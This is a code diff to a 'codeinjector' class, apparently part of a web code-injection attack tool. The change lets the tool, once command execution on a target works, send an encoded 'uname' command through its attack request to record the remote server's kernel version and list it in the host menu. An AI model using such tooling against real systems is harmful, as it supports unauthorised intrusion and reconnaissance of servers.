@@ -64,6 +64,8 @@ class codeinjector(baseClass):
         appendix = vuln.getAttribute("appendix")
         shcode = vuln.getAttribute("file")
         paramvalue = vuln.getAttribute("paramvalue")
+        kernel = domain.getAttribute("kernel")
+        if (kernel == ""): kernel = None
         payload = "%s%s%s" %(prefix, shcode, suffix)
         path = path.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, payload))
 
@@ -125,6 +127,14 @@ class codeinjector(baseClass):
                     sys_inject_works = True
                     working_shell = item
                     self._log("Execution thru '%s' works!"%(name), self.LOG_INFO)
+                    if (kernel == None):
+                        self._log("Requesting kernel version...", self.LOG_DEBUG)
+                        uname_cmd = payload.replace("__PAYLOAD__", base64.b64encode("uname -r -o -s"))
+                        kernel = self.__doHaxRequest(url, mode, uname_cmd, suffix).strip()
+                        self._log("Kernel received: %s" %(kernel), self.LOG_DEBUG)
+                        domain.setAttribute("kernel", kernel)
+                        self.saveXML()
+
                     break
 
             attack = None
@@ -353,6 +363,8 @@ class codeinjector(baseClass):
         textarr = []
         for n in nodes:
             host = n.getAttribute("hostname")
+            kernel = n.getAttribute("kernel")
+            if (kernel == ""): kernel = None
             showit = False
             for child in self.getNodesOfDomain(host):
                 mode = child.getAttribute("mode")
@@ -360,7 +372,10 @@ class codeinjector(baseClass):
                     showit = True
             if (showit or not OnlyExploitable):
                 choose[idx] = n
-                textarr.append("[%d] %s" %(idx, host))
+                if (kernel != None):
+                    textarr.append("[%d] %s (%s)" %(idx, host, kernel))
+                else:
+                    textarr.append("[%d] %s" %(idx, host))
                 idx = idx +1
 
         textarr.append("[q] Quit")
